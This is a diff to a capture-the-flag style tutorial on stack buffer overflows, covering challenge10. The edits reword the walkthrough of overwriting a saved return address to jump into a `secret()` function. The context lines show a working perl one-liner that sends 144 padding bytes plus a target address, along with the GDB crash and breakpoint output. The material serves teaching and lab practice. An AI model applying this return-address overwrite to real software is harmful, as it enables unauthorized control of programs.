@@ -101,7 +101,7 @@ Maybe we can call the function `secret()`? We would require the following things
 * The location in the input string which matches the location of the SIP on the stack (offset)
 
 
-## Find out address of target function
+## Find address of target function
 
 We can easily find out the address of `secret()`:
 
@@ -200,7 +200,9 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffde00 in ?? ()
 ```
 
-Outside GDB:
+While the program still crashed, it did print the string `Secret functionality`!
+
+Lets try it again without GDB:
 ```
 ~/challenges/challenge10$ ./challenge10 `perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"'` password
 isAdmin: 0x41414141
@@ -209,9 +211,9 @@ Secret functionality
 Segmentation fault (core dumped)
 ```
 
-It seems that the program crashes. But WAIT! It printed `Secret functionality!` before
+It printed `Secret functionality!` before
 it crashed! Does that mean that the `secret()` was executed? Lets double-check
-by setting a breakpoint in `secret()`:
+by setting a breakpoint in `secret()` and run it again in GDB:
 
 ```
 (gdb) b *secret
@@ -236,4 +238,4 @@ Indeed, breakpoint 1 was hit, and we stopped execution in `secret()`!
 # Things to think about
 
 * Why does it crash at the end?
-* Can you calculate the required offset just by using GDB?
+* Can you calculate the required offset just by using GDB? (instead of brute-forcing it manually)
